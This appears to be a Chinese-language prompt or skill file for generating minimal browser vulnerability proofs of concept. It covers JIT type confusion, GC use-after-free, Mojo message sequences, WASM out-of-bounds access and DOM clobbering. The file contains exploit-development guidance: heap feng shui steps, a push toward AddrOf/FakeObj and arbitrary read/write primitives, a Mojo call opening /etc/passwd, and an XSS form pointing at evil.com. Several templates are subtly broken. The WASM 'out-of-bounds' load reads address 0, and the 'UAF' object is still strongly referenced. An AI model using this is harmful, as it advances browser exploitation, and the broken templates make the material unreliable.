---
description: 浏览器最小 PoC 生成：类型混淆触发、GC 压力测试、Mojo 消息模糊、HTML/JS/WASM 模板
tags: [browser, PoC, fuzzing, JIT, GC, Mojo, HTML, JavaScript, WASM]
---

# 浏览器 PoC 生成器 (Browser PoC Generator)

## Triggers — 专家直觉触发器

生成 PoC 时，以下原则决定其质量：

1. **PoC 超过 50 行非空代码**：大概率包含无关逻辑，需要进一步最小化。真正的最小 PoC 通常少于 30 行。
2. **崩溃仅在特定页面加载顺序（如先点击按钮再刷新）下发生**：说明存在竞争条件，需要构造确定性的时序触发。
3. **PoC 使用了第三方库（如 jQuery、React）**：这些库的抽象层会干扰根因定位，必须剥离到原生 JS/DOM API。
4. **Mojo 崩溃需要完整浏览器启动，但核心消息序列可隔离为 2-3 条消息**：使用 `mojo_fuzzer` 或自定义代理构造最小消息序列。
5. **GC 相关漏洞需要特定内存压力曲线才能触发**：PoC 必须包含可重复的内存分配/释放模式，而非简单的 `gc()` 调用。
6. **JIT 漏洞的触发依赖于特定的优化阈值（如 `--turbo-filter`）**：PoC 应显式控制预热次数，而非依赖默认启发式。

## Question Chain — 不可跳过的问题链

Q1: **这个 PoC 中的每一行代码是否都是触发崩溃的必要条件？删除任一行是否导致崩溃消失？**
- 最小化不是“短”而是“必要”。使用 Delta Debugging 或手动二分删除验证。

Q2: **该 PoC 是否能在新启动的浏览器进程（无缓存、无扩展）中 100% 复现？**
- 若依赖扩展或缓存，说明触发条件未被完全理解。

Q3: **该 PoC 的内存布局是否确定？对象在堆上的相邻关系是否可通过预分配控制？**
- 对于 UAF 或类型混淆，堆布局决定崩溃是否可控。使用 `ArrayBuffer`、`TypedArray` 进行堆风水。

Q4: **Mojo PoC 的消息序列是否覆盖了所有可能的乱序组合？是否存在更短的序列触发相同状态？**
- 状态机漏洞的 PoC 长度与消息顺序强相关，需进行排列组合测试。

Q5: **GC 压力测试是否模拟了真实浏览器的 GC 行为（增量 GC、并发标记、紧凑化）？**
- 仅调用 `gc()` 不够，需要构造跨代引用以触发写屏障和标记阶段。

Q6: **该 PoC 是否包含可用于进一步利用的特征（如崩溃地址是否可控、对象类型是否可预测）？**
- 一个好的 PoC 不仅是“能崩溃”，还应暴露漏洞的利用潜力。

## Attack Chain Closure — 攻击链闭合逻辑

### PoC 生成的逻辑闭环

```
漏洞假设确认
    ↓
识别触发条件（输入类型、状态前提、时序要求）
    ↓
构造初始触发脚本（通常 >100 行）
    ↓
最小化（剥离 CSS/HTML，保留纯 JS/WASM/Mojo）
    ↓
稳定化（堆风水、确定性时序、固定随机种子）
    ↓
原语证明（若可能：展示 AddrOf、FakeObj、或 Arbitrary R/W）
    ↓
交付最小 PoC + 利用潜力说明
```

### 堆风水模板

```
目标：让受害者对象 A 紧邻对象 B（如 ArrayBuffer）
策略：
1. 喷射大量大小与 A 相同的对象，填满目标 Bucket
2. 释放中间的一个对象，制造空洞（Hole）
3. 立即分配 A，使其落入该空洞
4. 释放 A 相邻的对象，立即分配 B
结果：A 与 B 在内存中相邻，OOB 可直接覆盖 B 的元数据
```

## Code Examples — 脆弱模式与安全模式

### 1. JIT 类型混淆最小 PoC

```html
<!DOCTYPE html>
<script>
// 目标：触发 TurboFan CheckMaps 消除后的类型混淆
function opt(arr) {
  // 假设优化器认为 arr[0] 总是 HeapNumber
  return arr[0] + 1;
}

// 预热：使用 HeapNumber 数组触发优化
let num_arr = [1.1, 2.2, 3.3];
for (let i = 0; i < 100000; i++) {
  opt(num_arr);
}

// 切换 Map：使用包含 Object 的数组
let obj_arr = [{}];
opt(obj_arr);  // 崩溃：对象被当作浮点数处理
</script>
```

```html
<!-- 安全对照：优化器应保留 CheckMaps，阻止错误类型进入 -->
<script>
function opt_safe(arr) {
  // 显式类型检查阻止激进优化
  if (typeof arr[0] !== 'number') return NaN;
  return arr[0] + 1;
}
</script>
```

### 2. GC UAF 压力测试 PoC

```html
<!DOCTYPE html>
<script>
// 目标：在 GC 压缩阶段触发 UAF
let victim = null;
let ref = null;

function setup() {
  victim = document.createElement('div');
  victim.id = 'victim';
  document.body.appendChild(victim);
  
  // 创建跨代引用：老对象引用新对象
  ref = { target: victim };
  
  // 移除 DOM 引用，但 ref 仍持有 JS 引用
  victim.remove();
}

function stress_gc() {
  // 分配大量对象触发新生代 GC
  for (let i = 0; i < 1000; i++) {
    let arr = new Array(10000);
    arr.fill(i);
  }
  
  // 分配大对象触发老生代 GC / 压缩
  let big = new ArrayBuffer(100 * 1024 * 1024);
  
  // 尝试访问 ref.target，可能已 UAF
  console.log(ref.target.id);
}

setup();
stress_gc();
</script>
```

```html
<!-- 安全对照：使用 WeakRef 避免阻止 GC -->
<script>
let ref_safe = new WeakRef(victim);
// 访问前必须检查是否存活
let obj = ref_safe.deref();
if (obj) console.log(obj.id);
</script>
```

### 3. Mojo 消息最小序列

```python
#!/usr/bin/env python3
# 目标：构造触发浏览器进程状态机错误的最小 Mojo 消息序列

from mojo import core
from generated.mojom import file_system_manager

def minimal_mojo_poc():
    pipe = core.MessagePipe()
    proxy = file_system_manager.FileSystemManagerProxy(pipe.handle0)
    
    # 序列：直接发送操作消息，跳过初始化
    # 原始协议要求先 SendInitialize() 再 OpenFile()
    proxy.OpenFile("/etc/passwd", lambda f: print("Result:", f))
    
    # 运行事件循环等待响应
    core.RunLoop().RunUntilIdle()

minimal_mojo_poc()
```

```python
# 安全对照：正确序列不应触发异常
proxy.InitializeOrigin("https://trusted.com")
proxy.OpenFile("/trusted/path", lambda f: print("Result:", f))
core.RunLoop().RunUntilIdle()
```

### 4. WASM 内存越界 PoC

```html
<!DOCTYPE html>
<script>
// 目标：触发 WASM 线性内存边界检查失效
const wasmBuffer = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
  0x01, 0x04, 0x01, 0x60, 0x00, 0x00,             // type section
  0x03, 0x02, 0x01, 0x00,                         // func section
  0x05, 0x03, 0x01, 0x00, 0x01,                   // memory section: 1 page min
  0x07, 0x08, 0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00, // export
  0x0a, 0x0b, 0x01, 0x09, 0x00,                   // code section
  0x41, 0x00,                                     // i32.const 0
  0x28, 0x02, 0x00,                               // i32.load align=2 offset=0
  0x1a,                                           // drop
  0x0b                                            // end
]);

const mod = new WebAssembly.Module(wasmBuffer);
const inst = new WebAssembly.Instance(mod);

// 若漏洞存在，以下调用可能访问 64KB 内存页之外的地址
// 因为优化器可能基于 module 的初始内存大小而非运行时大小进行边界消除
inst.exports.main();
</script>
```

```html
<!-- 安全对照：浏览器应抛出 RangeError 或 WebAssembly.RuntimeError -->
<script>
try {
  inst.exports.main();
} catch (e) {
  console.assert(e instanceof WebAssembly.RuntimeError);
}
</script>
```

### 5. DOM Clobbering PoC

```html
<!DOCTYPE html>
<!-- 目标：通过 DOM ID 覆盖全局变量，干扰安全逻辑 -->
<form id="config" action="javascript:alert('XSS')">
  <input name="apiUrl" value="https://evil.com">
</form>

<script>
// 假设页面依赖全局变量 config 为普通对象
// 但由于 DOM Clobbering，config 指向 HTMLFormElement
console.log(typeof config);  // "object"，但不是预期的普通对象
console.log(config.apiUrl);  // HTMLInputElement，而非字符串

// 若后续代码执行 fetch(config.apiUrl)，实际行为不可预测
</script>
```

```html
<!-- 安全对照：使用严格模式并验证类型 -->
<script>
'use strict';
const config = window.config;
if (!(config instanceof Object) || config instanceof HTMLFormElement) {
  throw new Error('Config object is clobbered');
}
</script>
```

---

**核心原则**：一个好的 PoC 是“因果压缩包”——它以最少的代码行数，最确定的行为，最清晰的崩溃信号，证明了从“用户可控输入”到“内存破坏”的完整因果链。PoC 不是艺术品，是科学实验的复现脚本。如果审稿人不能运行你的 PoC 并在 10 秒内看到崩溃，那它还不够好。
